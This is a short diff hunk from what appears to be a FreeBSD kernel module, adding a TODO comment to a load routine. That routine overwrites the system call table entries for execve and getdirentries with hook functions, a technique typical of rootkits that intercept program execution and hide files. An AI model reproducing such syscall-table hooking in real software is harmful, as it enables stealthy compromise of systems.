@@ -103,6 +103,8 @@ static int load(struct module *module, int cmd, void *arg)
 {
     sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
     sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
+
+    /* TODO, add graceful unload support. */
     return 0;
 }
 
